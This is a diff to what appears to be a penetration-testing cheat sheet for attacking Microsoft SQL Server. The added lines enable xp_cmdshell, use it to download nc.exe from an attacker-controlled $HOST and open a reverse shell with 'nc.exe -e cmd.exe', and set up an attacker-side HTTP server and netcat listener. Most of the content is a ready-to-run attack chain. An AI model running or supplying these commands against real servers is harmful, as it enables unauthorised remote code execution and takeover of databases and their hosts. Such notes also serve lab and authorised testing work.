@@ -5,10 +5,16 @@
 - **Security Note:** MSSQL servers may be vulnerable to **default credentials, weak authentication, XP_CMDSHELL abuse, and privilege escalation attacks**.
 
 ## Basic Commands
+
 ```bash
 # Connect using authentication
 mssqlclient.py $USER@$IP -windows-auth
 
+# Connect using SQL authentication
+mssqlclient.py $USER:$PASSWORD@$IP
+```
+
+```sql
 # List databases
 SELECT name FROM master.dbo.sysdatabases;
 
@@ -29,17 +35,33 @@ SELECT IS_SRVROLEMEMBER('sysadmin');
 ```
 
 ## Exploitation
+
 ```sql
-enable_xp_cmdshell
-xp_cmdshell "powershell -c pwd"
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http:///$HOST/nc.exe -outfile nc.exe"
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe $HOST $PORT"
+-- Enable xp_cmdshell
+EXEC sp_configure 'show advanced options', 1;  -- Allow advanced options
+RECONFIGURE;
+
+EXEC sp_configure 'xp_cmdshell', 1;  -- Enable xp_cmdshell
+RECONFIGURE;
+
+-- Test xp_cmdshell
+xp_cmdshell "whoami";  -- Check current user
+xp_cmdshell "powershell -c pwd";  -- Get current directory
+
+-- Download nc.exe and save to Downloads
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://$HOST/nc.exe -outfile nc.exe";
+
+-- Start reverse shell with nc.exe
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe $HOST $PORT";
 ```
 
+### Attacker Machine
 ```bash
+# Host a file using Python HTTP server
 sudo python3 -m http.server 80
 ```
 
 ```bash
-sudo nc -lnvp 443
+# Start a Netcat listener to receive a shell
+sudo nc -lnvp $PORT
 ```
